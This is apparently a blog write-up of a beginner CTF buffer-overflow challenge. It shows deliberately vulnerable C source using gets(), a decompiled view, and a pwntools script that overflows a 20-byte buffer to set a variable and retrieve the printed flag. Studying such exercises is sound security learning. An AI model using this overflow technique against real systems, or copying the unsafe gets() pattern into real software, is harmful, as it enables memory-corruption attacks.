---
title: "Buffer Overflow"
date: 2021-12-11
draft: false
tags: ["Pwn"]
categories: ["Pwn"]
summary: "Writeup for Buffer Overflow"
author: "1byteBoy"
---

## Description

**`Author : rennfurukawa`**

Maybe it's your first time pwning? Can you overwrite the variable?

`nc ctf.tcp1p.com 17027`

-----------------

## Intuition

*Honestly i knew nothing about buffer overflows not even a A of it, but i did take time to learn some basic practises where we can overflow a stack by putting a long input, this is mainly due to a vulnerable function in C programming language named `gets()`* 

on connecting it asks us for an input

```
Can you get the exact value to print the flag?
Input:
```

so if we put some A's say `AAAAA` it says the following

```
Sad, too low! :(, maybe you can add *more* value 0_0

Output : AAA, Value : 0
```

now if we put a long string of A's `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

```
Too high!

Output : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, Value : 1094795585
```

note that the value changed from 0 to some large value too. 

*now to exactly understand what's going on, i have to download the source code file that came along with the challenge*

```c
#include <stdio.h>
#include <stdlib.h>

char buff[20];
int buff2;

void setup(){
	setvbuf(stdin, buff, _IONBF, 0);
	setvbuf(stdout, buff, _IONBF, 0);
	setvbuf(stderr, buff, _IONBF, 0);
}

void flag_handler(){
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
	printf("Cannot find flag.txt!");
	exit(0);
}

void buffer(){

	buff2 = 0;
	printf("Can you get the exact value to print the flag?\n");
	printf("Input: ");
	fflush(stdout);
	gets(buff);
	if (buff2 > 5134160) {
		printf("Too high!\n\n");
	} else if (buff2 == 5134160){
		printf("Congrats, You got the right value!\n");
		system("cat flag.txt");
	} else {
	printf("Sad, too low! :(, maybe you can add *more* value 0_0\n\n");
	}
	printf("\nOutput : %s, Value : %d \n", buff, buff2);
}

int main(){
	flag_handler();
	setup();
	buffer();
}
```

we can see that the initial buffer value or the input buffer size is `20` named *buff* and the code is doing something where is the extra buffer value is initialised to the integer variable named `buff2`  

and then in the conditional statement it is checking for that size, where if the buffer size is equal to 5134160 then we get our flag.

so i compiled the code and started testing on it, first thing i tried is checking the original buffer size by putting 20 A's in input field

```
Can you get the exact value to print the flag?
Input: AAAAAAAAAAAAAAAAAAAA
Sad, too low! :(, maybe you can add *more* value 0_0

Output : AAAAAAAAAAAAAAAAAAAA, Value : 0
```

expected, but what if we add one more A

```
Can you get the exact value to print the flag?
Input: AAAAAAAAAAAAAAAAAAAAA
Sad, too low! :(, maybe you can add *more* value 0_0

Output : AAAAAAAAAAAAAAAAAAAAA, Value : 65
```

okay 65, now if we observer 65 is ASCII value of capital letter `A`

that means after 20 A's we have to add some character's who's ASCII value set's to hex of `5134160`

## Solution

```
$ python3
>> hex(5134160)
'0x50574e'
```

which is ASCII is `PWN`

now if we enter `AAAAAAAAAAAAAAAAAAAAPWN`

```
Can you get the exact value to print the flag?                            
Input: AAAAAAAAAAAAAAAAAAAAPWN 
Congrats, You got the right value!                 
TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca} 
Output : AAAAAAAAAAAAAAAAAAAAPWN, Value : 5134160
```

*other way if we have done it is compiling the source code and open it with a tool named `ghidra`* where looking at the `buffer` function would gave us the same idea clearly 

```c
  if ((int)buff2 < 0x4e5751) {
    if (buff2 == 0x4e5750) {
      puts("Congrats, You got the right value!");
      system("cat flag.txt");
    }
    else {
      puts("Sad, too low! :(, maybe you can add *more* value 0_0\n");
    }
```

Here is getting done with code i have wrote with python

```python
#!/usr/bin/python3

from pwn import *

ip = 'ctf.tcp1p.com'
port = '17027'
r = remote(ip, port)

# setup
int_value = 5134160
hexa_string = hex(int_value)
slicing = hexa_string[2:]
converting_hexa = bytes.fromhex(slicing)
ascii_string = converting_hexa.decode()[::-1]

# payload
offset = 'A' * 20
payload = offset + ascii_string
  
# send payload
r.sendline(payload)
print(r.recvall().decode())
```

`TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca}`